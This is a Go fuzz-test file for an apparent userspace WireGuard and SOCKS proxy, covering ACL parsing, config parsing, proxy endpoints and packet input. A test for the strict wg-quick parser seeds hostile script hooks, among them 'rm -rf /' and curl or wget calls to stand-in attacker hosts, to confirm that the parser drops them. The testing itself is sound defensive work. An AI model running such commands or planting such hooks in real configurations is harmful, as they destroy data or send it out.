// Copyright (c) 2026 Reindert Pelsma
// SPDX-License-Identifier: ISC

package malicious

import (
	"bytes"
	"io"
	"net"
	"net/netip"
	"strings"
	"testing"
	"time"

	"github.com/reindertpelsma/userspace-wireguard-socks/internal/acl"
	"github.com/reindertpelsma/userspace-wireguard-socks/internal/config"
	"github.com/reindertpelsma/userspace-wireguard-socks/internal/netstackex"
	"gopkg.in/yaml.v3"
)

func FuzzACLParseRule(f *testing.F) {
	for _, seed := range []string{
		"allow dst=100.64.0.0/10 dport=80-443",
		"deny src=10.0.0.0/8 sport=1-65535",
		"allow",
		"wat src=::1/128 dport=65536",
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, rule string) {
		if len(rule) > 2048 {
			t.Skip()
		}
		r, err := acl.ParseRule(rule)
		if err != nil {
			return
		}
		list := acl.List{Default: acl.Deny, Rules: []acl.Rule{r}}
		if err := list.Normalize(); err != nil {
			return
		}
		_ = list.Allowed(netip.MustParseAddrPort("100.64.0.1:12345"), netip.MustParseAddrPort("100.64.0.2:443"), "tcp")
	})
}

func FuzzConfigParsers(f *testing.F) {
	for _, seed := range []string{
		"[Interface]\nAddress = 100.64.1.1/32\n",
		"proxy:\n  socks5: 127.0.0.1:1080\n",
		"wireguard:\n  addresses: [100.64.1.1/32]\n",
		string(bytes.Repeat([]byte("x"), 128)),
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, input string) {
		if len(input) > 8192 {
			t.Skip()
		}
		cfg := config.Default()
		_ = config.MergeWGQuick(&cfg.WireGuard, input)
		_ = yaml.Unmarshal([]byte(input), &cfg)
		_ = cfg.Normalize()
	})
}

// FuzzMergeWGQuickStrict pins the load-bearing invariant of the strict
// wg-quick parser: no matter what bytes an attacker pushes through the
// runtime API or any other untrusted INI surface, the resulting WireGuard
// struct must have zero PreUp / PostUp / PreDown / PostDown entries — there
// must be no way to stage a shell hook, even if scripts.allow is later
// flipped on by mistake.
//
// The seed corpus exercises the shapes a hostile config might use:
// vanilla scripts, the #! transport directives that ARE allowed by design,
// BOMs, NULs, mixed line endings, multi-kilobyte values. Anything the
// parser accepts must drop the script keys; anything else must error.
func FuzzMergeWGQuickStrict(f *testing.F) {
	scriptPath := "/tmp/should-not-be-touched"
	for _, seed := range []string{
		// Plain hostile shapes
		"[Interface]\nPrivateKey = aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkAAA=\nPostUp = touch " + scriptPath + "\n",
		"[Interface]\nPostDown = rm -rf /\n",
		"[Interface]\npreup = curl http://attacker/exfil\n",
		"[Interface]\nPRE_DOWN = wget evil\n",
		"[Interface]\n  PostUp   =   tabs and spaces matter\n",
		// #! directives that ARE allowed by design — they must continue
		// being accepted; this catches an over-eager strict mode.
		"[Interface]\nAddress = 100.64.0.2/32\n#!Control=http://control.example/\n[Peer]\nPublicKey = aGVsbG93b3JsZGhlbGxvd29ybGRoZWxsb3dvcmxkAAA=\nAllowedIPs = 100.64.0.1/32\n",
		"[Interface]\n#!TURN=turn://relay.example:3478\n",
		// Pathological encodings
		"\xef\xbb\xbf[Interface]\nPostUp = touch " + scriptPath + "\n", // UTF-8 BOM
		"[Interface]\nPostUp = bad\x00null\x00\n",                      // embedded NUL
		"[Interface]\r\nPostUp = crlf\r\n",                             // CRLF
		"[Interface]\nPostUp = " + strings.Repeat("A", 4096) + "\n",    // long value
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, input string) {
		if len(input) > 1<<16 {
			t.Skip()
		}
		var wg config.WireGuard
		err := config.MergeWGQuickStrict(&wg, input)
		// Whether the parser accepts or rejects the input doesn't matter.
		// What matters is: if it accepted, the script-hook fields MUST be
		// empty. A nonzero len here = the strict mode regressed.
		if err != nil {
			return
		}
		if len(wg.PreUp) != 0 {
			t.Fatalf("strict parser accepted PreUp=%v from input %q", wg.PreUp, input)
		}
		if len(wg.PostUp) != 0 {
			t.Fatalf("strict parser accepted PostUp=%v from input %q", wg.PostUp, input)
		}
		if len(wg.PreDown) != 0 {
			t.Fatalf("strict parser accepted PreDown=%v from input %q", wg.PreDown, input)
		}
		if len(wg.PostDown) != 0 {
			t.Fatalf("strict parser accepted PostDown=%v from input %q", wg.PostDown, input)
		}
	})
}

func FuzzSOCKSBlackBox(f *testing.F) {
	key := mustKey(f)
	cfg := config.Default()
	cfg.WireGuard.PrivateKey = key.String()
	cfg.WireGuard.Addresses = []string{"100.90.10.1/32"}
	cfg.Proxy.SOCKS5 = "127.0.0.1:0"
	eng := mustStartEngine(f, cfg)

	for _, seed := range [][]byte{
		nil,
		{0x05, 0x01, 0x00},
		{0x05, 0x01, 0x00, 0x05, 0x01, 0x00, 0x01, 127, 0, 0, 1, 0, 80},
		{0x05, 0x01, 0x00, 0x05, 0x03, 0x00, 0x03, 4, 't', 'e', 's', 't', 0, 53},
		bytes.Repeat([]byte{0xff}, 256),
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, payload []byte) {
		if len(payload) > 1024 {
			payload = payload[:1024]
		}
		conn, err := net.DialTimeout("tcp", eng.Addr("socks5"), time.Second)
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(300 * time.Millisecond))
		_, _ = conn.Write(payload)
		if tcp, ok := conn.(*net.TCPConn); ok {
			_ = tcp.CloseWrite()
		}
		_, _ = io.Copy(io.Discard, conn)
	})
}

func FuzzHTTPProxyBlackBox(f *testing.F) {
	key := mustKey(f)
	cfg := config.Default()
	cfg.WireGuard.PrivateKey = key.String()
	cfg.WireGuard.Addresses = []string{"100.90.11.1/32"}
	cfg.Proxy.HTTP = "127.0.0.1:0"
	eng := mustStartEngine(f, cfg)

	for _, seed := range [][]byte{
		[]byte("GET http://127.0.0.1/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"),
		[]byte("CONNECT 127.0.0.1:443 HTTP/1.1\r\nHost: 127.0.0.1:443\r\n\r\n"),
		[]byte("GET / HTTP/1.1\r\n"),
		bytes.Repeat([]byte{'A'}, 512),
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, payload []byte) {
		if len(payload) > 4096 {
			payload = payload[:4096]
		}
		conn, err := net.DialTimeout("tcp", eng.Addr("http"), time.Second)
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		_ = conn.SetDeadline(time.Now().Add(300 * time.Millisecond))
		_, _ = conn.Write(payload)
		if tcp, ok := conn.(*net.TCPConn); ok {
			_ = tcp.CloseWrite()
		}
		_, _ = io.Copy(io.Discard, conn)
	})
}

func FuzzNetstackPacketInput(f *testing.F) {
	for _, seed := range [][]byte{
		nil,
		{0x45, 0x00},
		{0x60, 0x00, 0x00, 0x00},
		bytes.Repeat([]byte{0xff}, 128),
	} {
		f.Add(seed)
	}
	f.Fuzz(func(t *testing.T, packet []byte) {
		if len(packet) > 2048 {
			packet = packet[:2048]
		}
		dev, _, err := netstackex.CreateNetTUN([]netip.Addr{netip.MustParseAddr("100.90.12.1")}, nil, 1420)
		if err != nil {
			t.Fatal(err)
		}
		defer dev.Close()
		_, _ = dev.Write([][]byte{packet}, 0)
	})
}
